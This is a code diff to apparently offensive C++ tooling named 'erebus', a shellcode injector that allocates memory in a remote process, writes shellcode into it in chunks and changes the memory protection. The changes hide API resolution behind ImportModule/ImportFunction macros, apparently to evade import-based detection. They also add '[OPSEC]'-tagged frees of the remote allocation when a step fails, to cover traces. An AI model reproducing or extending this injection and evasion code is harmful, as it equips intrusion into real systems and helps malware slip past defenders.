@@ -57,18 +57,19 @@ namespace erebus {
 		}
 
 		// Use standard Windows API instead of PEB-based resolution for MinGW compatibility
-		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+		HMODULE ntdll = ImportModule("ntdll.dll");
 		if (!ntdll)
 		{
 			LOG_ERROR("Failed to get ntdll.dll handle");
 			return NULL;
 		}
 
-		typeNtAllocateVirtualMemory NtAllocateVirtualMemory = (typeNtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
-		typeNtWriteVirtualMemory NtWriteVirtualMemory = (typeNtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
-		typeNtProtectVirtualMemory NtProtectVirtualMemory = (typeNtProtectVirtualMemory)GetProcAddress(ntdll, "NtProtectVirtualMemory");
+		ImportFunction(ntdll, NtAllocateVirtualMemory, typeNtAllocateVirtualMemory);
+		ImportFunction(ntdll, NtWriteVirtualMemory, typeNtWriteVirtualMemory);
+		ImportFunction(ntdll, NtProtectVirtualMemory, typeNtProtectVirtualMemory);
+		ImportFunction(ntdll, NtFreeVirtualMemory, typeNtFreeVirtualMemory);
 
-		if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtProtectVirtualMemory)
+		if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtProtectVirtualMemory || !NtFreeVirtualMemory)
 		{
 			LOG_ERROR("Failed to resolve NT functions");
 			return NULL;
@@ -97,11 +98,14 @@ namespace erebus {
 			if (!NT_SUCCESS(status))
 			{
 				LOG_ERROR("Error writing shellcode chunk (NTSTATUS: 0x%08lX). (Wrote %zu/%zu bytes)", status, chunk_written, chunk);
+				// [OPSEC] Free the remote allocation on write failure
+				NtFreeVirtualMemory(process_handle, &base_address, &allocation_size, MEM_RELEASE);
 				return NULL;
 			}
 			if (chunk_written != chunk)
 			{
 				LOG_ERROR("Incomplete chunk write: wrote %zu/%zu bytes", chunk_written, chunk);
+				NtFreeVirtualMemory(process_handle, &base_address, &allocation_size, MEM_RELEASE);
 				return NULL;
 			}
 
@@ -115,6 +119,8 @@ namespace erebus {
 		if (!NT_SUCCESS(status))
 		{
 			LOG_ERROR("Failed to change protection type (NTSTATUS: 0x%08lX)", status);
+			// [OPSEC] Free leaked RW allocation on protection change failure
+			NtFreeVirtualMemory(process_handle, &base_address, &allocation_size, MEM_RELEASE);
 			return NULL;
 		}
 
@@ -179,9 +185,9 @@ namespace erebus {
 	//
 	BOOL HeapFree(_In_ PVOID BlockAddress)
 	{
-		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+		HMODULE ntdll = ImportModule("ntdll.dll");
 		if (!ntdll) return FALSE;
-		typeRtlFreeHeap RtlFreeHeap = (typeRtlFreeHeap)GetProcAddress(ntdll, "RtlFreeHeap");
+		ImportFunction(ntdll, RtlFreeHeap, typeRtlFreeHeap);
 		if (!RtlFreeHeap) return FALSE;
 
 		return RtlFreeHeap(GetProcessHeap(), 0, BlockAddress) ? TRUE : FALSE;
@@ -193,9 +199,9 @@ namespace erebus {
 	//
 	PVOID HeapAlloc(_In_ SIZE_T Size)
 	{
-		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+		HMODULE ntdll = ImportModule("ntdll.dll");
 		if (!ntdll) return NULL;
-		typeRtlAllocateHeap RtlAllocateHeap = (typeRtlAllocateHeap)GetProcAddress(ntdll, "RtlAllocateHeap");
+		ImportFunction(ntdll, RtlAllocateHeap, typeRtlAllocateHeap);
 		if (!RtlAllocateHeap) return NULL;
 
 		// RtlAllocateHeap returns NULL on failure so no need to add error handling.
@@ -217,10 +223,10 @@ namespace erebus {
 	//
 	DWORD ProcessGetPidFromHashedListEx(_In_ DWORD* HashList, _In_ SIZE_T EntryCount, _In_ SIZE_T skipCount)
 	{
-		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+		HMODULE ntdll = ImportModule("ntdll.dll");
 		if (!ntdll) return 0;
 
-		typeNtQuerySystemInformation NtQuerySystemInformation = (typeNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
+		ImportFunction(ntdll, NtQuerySystemInformation, typeNtQuerySystemInformation);
 		if (!NtQuerySystemInformation) return 0;
 
 		DWORD pid = 0, returnlength = 0, name_hash = 0;
